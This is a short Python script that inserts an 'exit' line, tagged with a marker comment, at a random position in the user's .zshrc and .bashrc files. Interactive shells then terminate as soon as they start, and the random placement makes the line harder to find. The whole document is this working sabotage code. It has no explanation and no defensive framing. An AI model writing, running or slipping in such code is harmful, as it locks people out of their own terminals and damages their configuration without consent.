#!/usr/bin/env python3
import os
import random

MARKER = "# FT_CONNECT_EXIT"
FILES = [".zshrc", ".bashrc"]


def add_exit_to_file(path):
    if not os.path.exists(path):
        return

    with open(path, "r") as f:
        lines = f.readlines()

    if any(MARKER in line for line in lines):
        return

    line = f"exit {MARKER}\n"
    index = random.randint(0, len(lines))
    lines.insert(index, line)

    with open(path, "w") as f:
        f.writelines(lines)


def main():
    home = os.path.expanduser("~")
    for file in FILES:
        add_exit_to_file(os.path.join(home, file))


if __name__ == "__main__":
    main()
